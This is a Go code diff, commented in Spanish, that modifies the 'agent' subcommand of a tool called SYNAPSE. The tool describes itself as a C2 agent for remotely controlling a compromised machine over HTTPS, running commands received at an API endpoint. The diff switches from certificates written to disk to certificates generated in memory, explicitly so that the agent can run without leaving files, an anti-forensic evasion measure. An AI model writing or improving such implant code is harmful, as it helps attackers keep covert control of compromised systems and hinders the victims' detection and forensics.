@@ -4,10 +4,10 @@ package main
 import (
 	"crypto/rand"
 	"crypto/rsa"
+	"crypto/tls" // Importante para los certificados en memoria
 	"crypto/x509"
 	"crypto/x509/pkix"
 	"encoding/json"
-	"encoding/pem"
 	"fmt"
 	"log"
 	"math/big"
@@ -31,6 +31,7 @@ type CommandResponse struct {
 	Error  string `json:"error,omitempty"`
 }
 
+// Variables para los flags del comando.
 var agentPort string
 var apiKey string
 
@@ -39,9 +40,9 @@ func NewAgentCmd() *cobra.Command {
 	cmd := &cobra.Command{
 		Use:   "agent",
 		Short: "Inicia el agente para control remoto (C2)",
-		Long: `Ejecuta un servidor HTTPS seguro en segundo plano que espera órdenes.
+		Long: `Ejecuta un servidor HTTPS seguro que espera órdenes.
 Permite controlar esta herramienta de forma remota en una máquina comprometida.
-Genera automáticamente certificados SSL (cert.pem, key.pem) si no existen.`,
+Genera automáticamente certificados SSL en memoria para una operación sin ficheros.`,
 		Run: func(cmd *cobra.Command, args []string) {
 			if apiKey == "" {
 				log.Fatal("Error: Se requiere una clave API secreta (-k) para asegurar el agente.")
@@ -58,20 +59,32 @@ Genera automáticamente certificados SSL (cert.pem, key.pem) si no existen.`,
 
 // startAgentServer configura e inicia el servidor HTTPS del agente.
 func startAgentServer(port, key string) {
-	// Asegurarse de que los certificados SSL existen, si no, crearlos.
-	generateCertificates()
+	// Generar un certificado TLS en memoria para no escribir en disco.
+	tlsCert, err := generateInMemoryCertificate()
+	if err != nil {
+		log.Fatalf("Error fatal al generar el certificado TLS en memoria: %v", err)
+	}
 
-	// Configurar los endpoints de la API
+	// Configurar los endpoints de la API.
 	mux := http.NewServeMux()
 	commandHandler := http.HandlerFunc(handleCommand)
 	mux.Handle("/command", authMiddleware(commandHandler, key))
 	mux.HandleFunc("/", handleRoot)
 
-	log.Printf("Iniciando agente SYNAPSE en modo seguro (HTTPS) en el puerto %s...", port)
-	log.Printf("Utiliza la clave API para enviar comandos a https://<host>:%s/command", port)
+	// Configurar el servidor HTTPS para que use nuestro certificado en memoria.
+	server := &http.Server{
+		Addr:    ":" + port,
+		Handler: mux,
+		TLSConfig: &tls.Config{
+			Certificates: []tls.Certificate{*tlsCert},
+		},
+	}
 
-	// Iniciar el servidor TLS
-	err := http.ListenAndServeTLS(":"+port, "cert.pem", "key.pem", mux)
+	log.Printf("Iniciando agente SYNAPSE en modo seguro (HTTPS) en el puerto %s...", port)
+	log.Println("Utilizando certificados TLS generados en memoria (no se escriben en disco).")
+
+	// Iniciar el servidor TLS sin especificar los ficheros de certificado/clave.
+	err = server.ListenAndServeTLS("", "")
 	if err != nil {
 		log.Fatalf("Error fatal al iniciar el servidor del agente: %v", err)
 	}
@@ -110,18 +123,18 @@ func handleCommand(w http.ResponseWriter, r *http.Request) {
 
 	log.Printf("Orden recibida desde %s: comando='%s', args=%v", r.RemoteAddr, req.Comando, req.Args)
 
-	// Obtener la ruta del ejecutable actual para llamarse a sí mismo
+	// Obtener la ruta del ejecutable actual para llamarse a sí mismo.
 	executable, err := os.Executable()
 	if err != nil {
 		http.Error(w, "No se pudo encontrar la ruta del ejecutable: "+err.Error(), http.StatusInternalServerError)
 		return
 	}
 
-	// Construir el comando completo (ej: 'scaner-pro.exe scan 192.168.1.1 80')
+	// Construir el comando completo (ej: 'scaner-pro.exe scan 192.168.1.1 80').
 	fullArgs := append([]string{req.Comando}, req.Args...)
 	cmd := exec.Command(executable, fullArgs...)
 
-	// Ejecutar el comando y capturar la salida (stdout y stderr combinados)
+	// Ejecutar el comando y capturar la salida (stdout y stderr combinados).
 	output, err := cmd.CombinedOutput()
 
 	resp := CommandResponse{
@@ -136,18 +149,11 @@ func handleCommand(w http.ResponseWriter, r *http.Request) {
 	json.NewEncoder(w).Encode(resp)
 }
 
-// generateCertificates crea cert.pem y key.pem si no existen.
-func generateCertificates() {
-	if _, err := os.Stat("cert.pem"); err == nil {
-		// Los archivos ya existen
-		return
-	}
-
-	log.Println("Generando nuevos certificados SSL (cert.pem, key.pem)...")
-
+// generateInMemoryCertificate crea un certificado TLS y lo devuelve en memoria.
+func generateInMemoryCertificate() (*tls.Certificate, error) {
 	priv, err := rsa.GenerateKey(rand.Reader, 2048)
 	if err != nil {
-		log.Fatalf("Fallo al generar la clave privada: %v", err)
+		return nil, err
 	}
 
 	template := x509.Certificate{
@@ -157,7 +163,7 @@ func generateCertificates() {
 			CommonName:   "SYNAPSE C2",
 		},
 		NotBefore:             time.Now(),
-		NotAfter:              time.Now().AddDate(10, 0, 0), // Válido por 10 años
+		NotAfter:              time.Now().AddDate(1, 0, 0), // Válido por 1 año
 		KeyUsage:              x509.KeyUsageKeyEncipherment | x509.KeyUsageDigitalSignature,
 		ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
 		BasicConstraintsValid: true,
@@ -165,18 +171,14 @@ func generateCertificates() {
 
 	derBytes, err := x509.CreateCertificate(rand.Reader, &template, &template, &priv.PublicKey, priv)
 	if err != nil {
-		log.Fatalf("Fallo al crear el certificado: %v", err)
+		return nil, err
 	}
 
-	// Guardar el certificado
-	certOut, _ := os.Create("cert.pem")
-	pem.Encode(certOut, &pem.Block{Type: "CERTIFICATE", Bytes: derBytes})
-	certOut.Close()
+	// Crear la estructura de certificado TLS que el servidor necesita, sin guardarla en disco.
+	cert := &tls.Certificate{
+		Certificate: [][]byte{derBytes},
+		PrivateKey:  priv,
+	}
 
-	// Guardar la clave privada
-	keyOut, _ := os.Create("key.pem")
-	pem.Encode(keyOut, &pem.Block{Type: "RSA PRIVATE KEY", Bytes: x509.MarshalPKCS1PrivateKey(priv)})
-	keyOut.Close()
-
-	log.Println("Certificados generados correctamente.")
+	return cert, nil
 }
